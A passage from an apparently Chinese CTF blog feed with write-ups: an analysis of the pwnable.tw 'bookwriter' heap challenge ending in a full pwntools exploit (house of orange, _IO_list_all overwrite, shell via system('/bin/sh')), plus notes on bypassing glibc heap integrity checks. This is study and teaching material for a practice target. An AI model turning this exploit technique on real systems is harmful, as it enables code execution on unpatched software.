class="line">        view();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3L</span>L:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4L</span>L:</span><br><span class="line">        info();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5L</span>L:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中定义了两个int_64[8]数组在BSS段，分别存储书页的地址和书页内容大小信息，两数组在BSS段上位置相邻。</p>
<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>添加的操作顺序从0到8依次搜索，判断标准是该位置是否为空，并获得一次向堆地址写的机会</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't add new page anymore!"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !qword_6020A0[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size of page :"</span>);</span><br><span class="line">  size = get_num();</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Error !"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">  my_read((__int64)v2, size);</span><br><span class="line">  qword_6020A0[i] = v2;</span><br><span class="line">  qword_6020E0[i] = size;</span><br><span class="line">  ++dword_602040;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="view"><a href="#view" class="headerlink" title="view"></a>view</h3><p>利用%s输出信息，可以用来泄露libc和heap信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">view</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index of page :"</span>);</span><br><span class="line">  v1 = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"out of page:"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !qword_6020A0[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Not found !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Page #%u \n"</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Content :\n%s\n"</span>, qword_6020A0[v1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><p>编辑操作，可以输入0到7的数值，用strlen重新确定大小</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400B27</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index of page :"</span>);</span><br><span class="line">  v1 = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"out of page:"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !qword_6020A0[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Not found !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content:"</span>);</span><br><span class="line">  my_read((__int64)qword_6020A0[v1], qword_6020E0[v1]);</span><br><span class="line">  qword_6020E0[v1] = <span class="built_in">strlen</span>(qword_6020A0[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="info"><a href="#info" class="headerlink" title="info"></a>info</h3><p>输出名称信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">info</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Author : %s\n"</span>, &amp;unk_602060);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Page : %u\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602040);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Do you want to change the author ? (yes:1 / no:0) "</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    sub_400BDF();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><ul>
<li>首先注意到name所在bss段位置与存储heap信息的bss段相邻，因此可以用info泄露heap地址</li>
<li>eidt的时候是用strlen重新计算size的，因此两次edit后可以覆盖到下一个堆块的size位置</li>
<li>add的时候多add了一个，应该是0到7就可以。利用的话就是堆地址会写到heap_page[0]的size位置，这样就可以造成很长的堆溢出</li>
</ul>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>整个程序都没有出现free，house of orange的典型利用场景。</p>
<p>利用条件</p>
<ul>
<li>泄露heap，libc地址</li>
<li>堆溢出</li>
<li>libc2.23 及以下版本</li>
</ul>
<h3 id="泄露信息（libc地址）"><a href="#泄露信息（libc地址）" class="headerlink" title="泄露信息（libc地址）"></a>泄露信息（libc地址）</h3><p>因为程序中有堆的越界写，可以修改<code>top_chunk</code>的大小。在<code>malloc</code>源码里面如果申请的堆块大小超过了<code>top_chunk</code>的大小，将调用<code>sysmalloc</code>来进行分配。<br><code>sysmalloc</code>里面针对这种情况有两种处理，一种是直接<code>mmap</code>出来一块内存，另一种是扩展<code>top_chunk</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If have mmap, and the request size meets the mmap threshold, and</span></span><br><span class="line"><span class="comment">   the system supports mmap, and there are few enough currently</span></span><br><span class="line"><span class="comment">   allocated mmapped regions, try to directly map this request</span></span><br><span class="line"><span class="comment">   rather than expanding top.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold) &amp;&amp;</span><br><span class="line">    (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line">  try_mmap:</span><br></pre></td></tr></table></figure>

<p>就是如果申请大小<code>&gt;=mp_.mmap_threshold</code>,就会<code>mmap</code>。我们质只要申请不要过大，一般不会触发这个，这个<code>mmap_threshold</code>的值为<code>128*1024</code>。<br>不过下面还有两个<code>assert</code>需要检查，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);</span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"> </span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; pagemask) == <span class="number">0</span>));</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>

<p>第一个assert就是要求修改后的<code>top_chunk_size</code>必须满足</p>
<ol>
<li><code>top_chunk</code>的size必须大于<code>MINSIZE</code></li>
<li><code>top_chunk</code>的pre_inuse位必须为1</li>
<li>让<code>top_chunk</code>满足页对齐，一般就是后三位都为0</li>
<li><code>top_chunk</code>的size小于申请的大小</li>
</ol>
<p>满足以上四个条件之后，继续往下执行最后把原先的那个old_top给释放掉了，进入<code>unsortedbin</code>中</p>
<p>这样的话我们再次申请一个堆块分配到这块区域中就能泄露libc地址了</p>
<h3 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3><p>我们知道有rop即<code>retn Oriented Programming</code>，那么其实<code>File Stream Oriented Programming</code>是一个道理的。也是一种劫持程序流程的方法，只不过方式是通过攻击<code>File Stream</code>来实现罢了。<br>我们先要了解malloc对错误信息的处理过程,<code>malloc_printerr</code>是malloc中用来打印错误的函数。<br><img src="/19/cl7iordpt003d293f8sm1c5l1/1.jpg" alt></p>
<p><code>malloc_printerr</code>其实是调用<code>__libc_message</code>函数之后调用<code>abort</code>函数，<code>abort</code>函数其中调用了<code>_IO_flush_all_lockp</code>，这里面用到<code>IO_FILE_ALL</code>里面的结构，采用的是虚表调用的方式。<br><img src="/19/cl7iordpt003d293f8sm1c5l1/2.jpg" alt></p>
<p>这里也学到一个操作，调试这里的时候可以直接<code>b _IO_flush_all_lockp</code>来断到这个函数，然后看自己的fsop是不是成功了,也可以直接用fsop这个命令。最后看第二个fp是不是unsortedbin的地址，还有就是Func是不是自己想要跳转的函数<br><img src="/19/cl7iordpt003d293f8sm1c5l1/3.png" alt></p>
<p>其中使用到了IO_FILE对象中的虚表，如果我们能够修改IO_FILE的内容那么就可以一定程度上劫持流程。<br>IO_FILE_ALL是一个指向IO_FILE_plus的结构指针，结构如下图所示，具体结构不需要太了解清晰，大概懂一些也就行。</p>
<p><img src="/19/cl7iordpt003d293f8sm1c5l1/4.jpg" alt></p>
<p>那么怎么劫持呢，这里又需要用到<code>unsortbin attack</code>的知识。<br><code>unsortbin attack</code>是怎么一回事呢，其实就是在malloc的过程中，unsortbin会从链表上卸下来（只要分配的大小不是fastchunk大小）,只要我们能控制unsortedbin的bk内容，在unlink的时候就会把unsortedbin的地址写入bk+0x10的位置</p>
<p>这样我们把<code>_IO_list_all</code>的地址改成<code>main_arena</code>,但是<code>main_aren</code>上的内容我们也不是完全可控的，于是就是这个利用很精妙的地方，让其通过<code>chain</code>跳转到我们能自己控制内容的地方即伪造的FILE结构</p>
<p>这里还是要牵扯到<code>io_file</code>的使用，<code>IO_FILE</code>结构中有一个字段是<code>chian</code>字段，它位于<code>0x60</code>偏移处,他指向的是下一个<code>IO_FILE</code>结构体，我们如果可以控制这个字段，就再次指定io_file的位置，它相当于是一个链表的结构<br>这样的话又联系到smallchunk的问题，在拆卸unsort_bin时候对属于small_bin的chunk进行了记录操作。</p>
<p>这个时候<code>IO_FILE_all</code>指向的正是<code>main_arena</code>的bins里面<code>unsortbin</code>的位置，那么偏移<code>0x60</code>处正好是，<code>smallchunk</code>的<code>index</code>为<code>6</code>的地方，也就是满足大小为16*6的chunk，所以<code>upgrade</code>时候需要把<code>unsortbin</code>设置为<code>0x60</code>大小。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">…</span><br><span class="line">    fp = fp-&gt;_chain;</span><br><span class="line">    ...</span><br><span class="line">          <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure>

<p>下一步就是在原top内伪造_IO_file_plus结构体，满足</p>
<ol>
<li><p>fp-&gt;mode&gt;=0</p>
</li>
<li><p>_IO_vtable_offset (fp) ==0</p>
</li>
<li><p>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</p>
<p>即可，构造的结构体如下：（不小心按错退出了，与原先的top地址有变化）<br><img src="/19/cl7iordpt003d293f8sm1c5l1/5.jpg" alt><br><img src="/19/cl7iordpt003d293f8sm1c5l1/6.jpg" alt><br>最终再malloc一个块，触发即可</p>
</li>
</ol>
<h2 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04 EXP"></a>0x04 EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">'./bookwriter'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10304</span>)</span><br><span class="line">    libc = ELF(<span class="string">'libc_64.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Size of page :'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index of page :'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index of page :'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(choice)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_heap</span><span class="params">()</span>:</span></span><br><span class="line">    info(<span class="number">0</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">    heapbase = u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">'heapbase: '</span> + hex(heapbase))</span><br><span class="line">    sh.recvuntil(<span class="string">'(yes:1 / no:0) '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> heapbase</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Author :'</span>)</span><br><span class="line">sh.send(<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1\x0f\x00'</span>)</span><br><span class="line"></span><br><span class="line">heap_base = leak_heap()</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\0'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">'wwwwwwww'</span>)</span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'wwwwwwww'</span>)</span><br><span class="line">libc_addr = u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = libc_addr - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'\x00'</span>*<span class="number">0x290</span></span><br><span class="line">payload += <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)  + p64(libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>] - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">9</span> + p64(system_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">11</span> + p64(heap_base+<span class="number">0x120</span>+<span class="number">0x50</span>+<span class="number">0x170</span>+<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Size of page :'</span>)</span><br><span class="line">sh.sendline(str(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="http://p4nda.top/2017/12/15/pwnable-tw-bookwriter/" target="_blank" rel="noopener">http://p4nda.top/2017/12/15/pwnable-tw-bookwriter/</a><br><a href="https://bbs.pediy.com/thread-222718.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222718.htm</a></p>
]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
      <tags>
        <tag>IO_FILE</tag>
        <tag>堆溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>堆的检测绕过总结</title>
    <url>/year/02/08/cl7iordqh0056293fm0vc6czf/</url>
    <content><![CDATA[<h2 id="0x0-简介"><a href="#0x0-简介" class="headerlink" title="0x0 简介"></a>0x0 简介</h2><p>这里总结一下堆里面安全性的检测和如何绕过</p>
<a id="more"></a>
<h2 id="0x1-unlink"><a href="#0x1-unlink" class="headerlink" title="0x1 unlink"></a>0x1 unlink</h2><p>unlink 用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来，可能在以下地方使用</p>
<ul>
<li><p>malloc </p>
<ul>
<li>从恰好大小合适的 large bin 中获取 chunk。<ul>
<li><strong>这里需要注意的是 fastbin 与 small bin 就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。</strong></li>
<li>依次遍历处理 unsorted bin 时也没有使用 unlink 。</li>
</ul>
</li>
<li>从比请求的 chunk 所在的 bin 大的 bin 中取 chunk。</li>
</ul>
</li>
<li><p>free</p>
<ul>
<li>后向合并，合并物理相邻低地址空闲 chunk。</li>
<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>
</ul>
</li>
<li><p>malloc_consolidate</p>
<ul>
<li>后向合并，合并物理相邻低地址空闲 chunk。</li>
<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>
</ul>
</li>
<li><p>realloc</p>
<ul>
<li>前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>
</ul>
</li>
</ul>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>由于 unlink 使用非常频繁，所以 unlink 被实现为了一个宏，如下</p>
<p>总结下它的检测</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">     malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure>

<ol>
<li><p>当需要unlink一个堆块时首先检测大小是否等于后一块的prev_size</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;                                                                      \</span><br><span class="line">   BK = P-&gt;bk;                                                                      \</span><br><span class="line">   <span class="comment">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>
</li>
<li><p>接着检查unlink的堆块是否在链表中</p>
</li>
</ol>
<h2 id="0x2-int-malloc"><a href="#0x2-int-malloc" class="headerlink" title="0x2 _int_malloc"></a>0x2 _int_malloc</h2><p>总结一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">           <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">           <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">           <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">               errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">           errout:</span><br><span class="line">               malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>从fastbin中取出chunk后，检查size是否属于fastbin</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                bck = victim-&gt;bk;</span><br><span class="line">                <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                    errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                    <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>从smallbin中除去chunk后，检查victim-&gt;bk-&gt;fd == victim</li>
<li>从unsortbin取chunk时，要检查2*sizet &lt; 内存总分配量</li>
<li>从 largebin取chunk时，切分后的chunk要加入unsortedbin,需要检查 unsortedbin的第一个chunk的bk是否指向unsortedbin</li>
<li>如果freebin中有合适大小的堆块那么执行unlink操作</li>
</ol>
<h2 id="0x3-free"><a href="#0x3-free" class="headerlink" title="0x3 free"></a>0x3 free</h2><ol>
<li><p>free的检查主要是根据本chunk的size检测下一块的inuse位，查看是否有double free的情况发生</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mchunkptr    old     = *fb, old2;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">       add</span></span><br><span class="line"><span class="comment">       (i.e., double free).  */</span></span><br><span class="line">    <span class="comment">// so we can not double free one fastbin chunk</span></span><br><span class="line">    <span class="comment">// 防止对 fast bin double free</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        old_idx = fastbin_index(chunksize(old));</span><br><span class="line">    p-&gt;fd = old2 = old;</span><br><span class="line">&#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) !=</span><br><span class="line">         old2);</span><br></pre></td></tr></table></figure>
</li>
<li><p>检查当前free的chunk是否与fastbin中的第一个chunk相同，相同则报错</p>
</li>
<li><p>根据当前的inuse以及后一块的后一块的inuse判断是否需要合并，如果需要合并则对在链表中的freebin进行unlink操作</p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_file 总结</title>
    <url>/year/02/08/cl7iordou000v293f0tkuetk4/</url>
    <content><![CDATA[<h2 id="0x0-简介"><a href="#0x0-简介" class="headerlink" title="0x0 简介"></a>0x0 简介</h2><p>熟悉一下IO_file，参考下列资料</p>
<p><a href="https://qianfei11.github.io/2019/08/17/Pwnable-tw-seethefile/" target="_blank" rel="noopener">https://qianfei11.github.io/2019/08/17/Pwnable-tw-seethefile/</a></p>
